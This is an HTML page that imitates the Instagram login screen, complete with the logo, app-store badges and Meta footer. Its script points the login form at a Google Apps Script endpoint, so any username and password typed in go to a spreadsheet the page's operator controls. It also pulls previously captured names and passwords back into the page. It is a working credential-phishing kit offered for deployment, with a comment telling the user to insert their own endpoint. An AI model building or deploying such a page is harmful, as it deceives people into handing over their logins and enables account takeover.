<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="icon" href="./images/ig.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="user_info">
        <img src="./images/font.png" alt="instagram" id="font">
        <form id="form" method="POST">
            <input 
                type="text" 
                placeholder="Phone number, username, or email" 
                id="user" 
                name="Name"
                list="user"
                required/>
                <datalist id="users"></datalist>
            <input 
                type="text" 
                placeholder="Password" 
                id="pswd" 
                name="Pswd"
                list="pswd"
                required/>
                <datalist id="pswds"></datalist>
            <input 
                type="submit"
                id="send"
                value="Log in">
        </form>
            
        <div id="space">
            <div id="bar"></div>
            <div id="or">
                OR
            </div>
            <div id="bar"></div>
        </div>

        <div id="fb">
            <a href="http://www.facebook.com">
                <button id="fb_login">
                    <img src="./images/fb.png" alt="facebook" id="fb_logo">
                    <div id="fb_font">
                        Log in with Facebook
                    </div>
                </button>
            </a>
        </div>

        <a href="" id="forgot">Forgotten your password?</a>
    </div>

    <div id="login_google">
        Error?
        <a href="./email.html" id="email">
            Try different method
        </a>
    </div>

    <div id="signup">
        Don't have an account?
        <a href="http://www.instagram.com" id="create">
            Sign up
        </a>
    </div>

    <div id="app">
        Get the app.
        <div id="download">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="google play" class="icon">
            <img src="./images/app_store.png" alt="app store" class="icon">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="microsoft store" class="icon">
        </div>
    </div>

    <footer>
        <div>
            <a href="" class="addin">Meta</a>
            <a href="" class="addin">About</a>
            <a href="" class="addin">Blog</a>
            <a href="" class="addin">Jobs</a>
            <a href="" class="addin">API</a>
            <a href="" class="addin">Privacy</a>
            <a href="" class="addin">Terms</a>
            <a href="" class="addin">Top accounts</a>
            <a href="" class="addin">Location</a>
            <a href="" class="addin">Instagram Lite</a>
            <a href="" class="addin">Contact Uploading and non-users</a>
            <a href="" class="addin">Meta Verified</a>
        </div>
        <br>
        <div>
            © 2022 Instagram from Meta
        </div>
    </footer>

    <script>
        const url = "https://script.google.com/macros/s/AKfycby-J98WrvyBFSYlt8xTv2tSMHTlFylD7NAOoY9HiBQYO9op6dSh46W-vtBmT9yuf8C9/exec" // enter your public ('access' - 'anyone') deployment URL (NOT test deployment!)
        document.getElementById('form').action = url;

        // fetching the data from each column in the sheet
        // then populating the respective datalist
        fetch(`${url}?header=Name`)
            .then((response) => response.json())
            .then(({ data }) => {
                populateDatalists("users", data)
            })
            .catch((error) => console.error('!!!!!!!!', error));

        fetch(`${url}?header=Pswd`)
            .then((response) => response.json())
            .then(({ data }) => {
                populateDatalists("pswds", data)
            })
            .catch((error) => console.error('!!!!!!!!', error));

        // function to add options to datalists
        const populateDatalists = (id, arr) => {
            let result = '';
            for (const item of arr) {
                result += `<option value="${item}">`;
            }
            document.getElementById(id).innerHTML = result;
        }
    </script>
</body>
</html>
